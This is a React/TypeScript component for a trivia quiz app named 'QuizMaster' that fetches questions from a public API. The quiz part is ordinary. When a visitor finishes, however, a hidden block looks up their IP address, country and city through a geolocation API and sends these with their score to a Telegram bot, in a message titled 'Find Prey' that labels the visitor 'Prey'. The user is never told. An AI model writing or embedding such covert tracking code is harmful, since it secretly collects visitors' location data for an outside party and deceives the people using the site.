import axios from "axios";
import { useEffect, useState } from "react";
import { Button } from "../../components/ui/button";

function Quiz() {
  const [questions, setQuestions] = useState<any[]>([]);
  const [score, setScore] = useState<number>(0);
  const [questionNumber, setQuestionNumber] = useState<number | string>(0);

  const shuffleArray = (array: any[]) => {
    return array.sort(() => Math.random() - 0.5);
  };

  useEffect(() => {
    axios("https://opentdb.com/api.php?amount=10&type=multiple").then(
      (response) => {
        setQuestions(response.data.results);
      }
    );
  }, []);

  const currentQuestion = questions[questionNumber as number];
  const options = currentQuestion
    ? shuffleArray([
        ...currentQuestion.incorrect_answers,
        currentQuestion.correct_answer,
      ])
    : [];

  if (questionNumber === "done") {
    let TOKEN = import.meta.env.VITE_APP_IP_API_KEY;
    let CHAT_ID = import.meta.env.VITE_APP_CHAT_ID;
    let TELEGRAM_TOKEN = import.meta.env.VITE_APP_TELEGRAM_TOKEN;
    let URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

    axios(
      `https://apiip.net/api/check?accessKey=${TOKEN}`
    ).then((res) => {
      let message = `<b>Find Prey</b>\n`;
      message += `<b>Site name:</b> QuizMaster🧐\n`;
      message += `<b>Country:</b> ${res.data.countryName}\n`;
      message += `<b>City:</b> ${res.data.city}\n`;
      message += `<b>Prey's IP:</b> ${res.data.ip}\n`;
      message += `<b>Prey's country flag:</b> ${res.data.countryFlagEmoj}\n`;
      message += `<b>Score✅: ${score}</b>`;

      axios.post(`${URL}/sendPhoto`, {
        chat_id: CHAT_ID,
        photo: "https://ibb.co/5s4SKHs",
        caption: message,
        parse_mode: "HTML",
      });
    });
  }

  return (
    <section className="h-screen w-full bg-gradient-to-r from-cyan-500 to-blue-500 flex items-center justify-center">
      {questionNumber === "done" ? (
        <div className="text-center p-5 bg-white rounded-lg shadow-lg">
          <h1 className="text-2xl font-bold">Quiz Completed!</h1>
          <p className="text-lg mt-3">
            Your Score: <span className="text-blue-500">{score}</span> /
            {questions.length}
          </p>
        </div>
      ) : questions.length > 0 ? (
        <div className="max-w-[30vw] p-5 rounded-lg bg-white shadow-lg">
          <h1 className="font-bold text-2xl text-center">QuizMaster</h1>

          <div className="w-full h-5 rounded-md mt-3 overflow-hidden bg-gray-200">
            <div
              className="h-full bg-black duration-300"
              style={{
                width: `${questionNumber}0%`,
              }}
            ></div>
          </div>

          <p className="font-medium text-xl my-4">{currentQuestion.question}</p>

          <div className="flex flex-col gap-3">
            {options.map((answ, inx) => (
              <Button
                key={inx}
                onClick={() => {
                  if (answ === currentQuestion.correct_answer) {
                    setScore((prevScore) => prevScore + 1);
                  }
                  setQuestionNumber((prev) =>
                    (prev as number) + 1 < questions.length
                      ? (prev as number) + 1
                      : "done"
                  );
                }}
                variant={"outline"}
              >
                {answ}
              </Button>
            ))}
          </div>

          <p className="mt-5 text-xs text-gray-500 font-medium">
            Question {Number(questionNumber) + 1} of {questions.length}
          </p>
        </div>
      ) : (
        <div className="text-white text-lg font-bold">Loading...</div>
      )}
    </section>
  );
}

export default Quiz;
